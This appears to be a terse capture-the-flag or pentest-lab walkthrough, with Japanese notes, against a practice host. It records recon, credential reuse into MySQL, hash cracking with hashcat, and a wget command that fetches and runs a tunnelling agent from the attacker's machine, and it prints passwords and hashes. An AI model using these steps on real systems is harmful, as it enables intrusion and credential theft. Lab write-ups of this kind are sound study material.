==🔴Recon==

└─$ sudo nmap -Pn -n 192.168.166.223 -p- -sC -sV --min-rate=5000 -oX 223.xml

![[wt image 15.png]]

==🔴Initial Access==

![[wt image 16.png]]

==🔴Foot Hold==

![[wt image 17.png]]

![[wt image 18.png]]

![[wt image 19.png]]

==🔴Enum==

www-data@milan:/tmp$ netstat -anop | grep 127.0.0.1

![[wt image 20.png]]

www-data@milan:/var/www/html/froxlor$ cat .travis.yml

![[wt image 21.png]]

※上記の認証は機能せず

![[wt image 22.png]]

oscuser

==🟣7NVLVTDGJ38HM2TQ==

※このパスワードをrootとして実行する

www-data@milan:/tmp$ mysql -u root -p

![[wt image 23.png]]

![[wt image 24.png]]

![[wt image 25.png]]

MariaDB \[froxlor\]> select * from panel_customers\G

![[wt image 26.png]]

![[wt image 27.png]]

flybike

==🟣$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2==

└─$ hashcat -m 7400 '$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force

![[wt image 28.png]]

![[wt image 29.png]]

$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2:==🟣Christopher==

==🔴Enum Net==

www-data@milan:/tmp$ netstat -anop | grep ::

![[wt image 30.png]]

==🔴Port Forwording==

RCE_SHELL$ wget http://192.168.45.231/agent -O /tmp/agent

RCE_SHELL$ chmod +x /tmp/agent

RCE_SHELL$ /tmp/agent -connect 192.168.45.231:22 -ignore-cert

![[wt image 31.png]]

![[wt image 32.png]]

└─$ ~/Tools/PENTEST_and_Red/Port_Forwarding/ligolo-ng/release/ligolo-ng_proxy_0.8_linux_amd64/proxy -selfcert -laddr 0.0.0.0:22

![[wt image 33.png]]

└─$ sudo ip route add 240.0.0.1/32 dev ligolo

![[wt image 34.png]]

![[wt image 35.png]]

![[wt image 36.png]]

![[wt image 37.png]]

![[wt image 38.png]]

![[wt image 39.png]]

![[wt image 40.png]]

x

a

![[wt image 41.png]]

![[wt image 42.png]]

接続用のphpファイルを実行するように事前に置いておくと数分後に実行される

![[wt image 43.png]]

![[wt image 44.png]]